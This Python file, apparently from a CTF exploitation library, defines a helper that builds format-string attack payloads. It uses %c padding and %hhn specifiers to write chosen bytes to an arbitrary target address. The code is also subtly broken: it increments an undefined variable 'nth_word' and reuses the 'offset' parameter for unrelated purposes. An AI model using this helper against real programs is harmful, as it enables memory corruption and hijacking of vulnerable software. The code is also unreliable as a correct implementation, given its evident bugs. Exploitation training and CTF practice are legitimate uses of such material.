from toyotama.pwn.util import *



def fsa_write(target_addr: int, contents: int, nth_stack: int, output=0, sofar=0, offset=0, bits=64):
    """
    target_addr: The address where the content will be written
    contents: What you want to write
    output: The number of characters which executable output
    sofar: The length of payload so far 
    nth_stack: example 
                "AAAA%p %p %p..."
                -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                -> 7th (0x4141d402)
    offset: from this example, offset is 2 (0x4141d402)
    """

    pack = p64 if bits == 64 else p32

    # adjust stack alignment
    payload = fill(-offset%(bits//8))
    if offset != 0:
        nth_word += 1

    for byte in pack(contents):
        offset = byte - output%0x100 
        if offset <= 1:
            offset += 0x100
        payload += f'%{offset}c%{nth_stack}$hhn'.encode()
        nth_stack += 1
        output += offset
    
    payload += b'\x00'*(128-len(payload)-sofar)

    for i in range(bits//8):
        payload += pack(target_addr+i)

    return payload


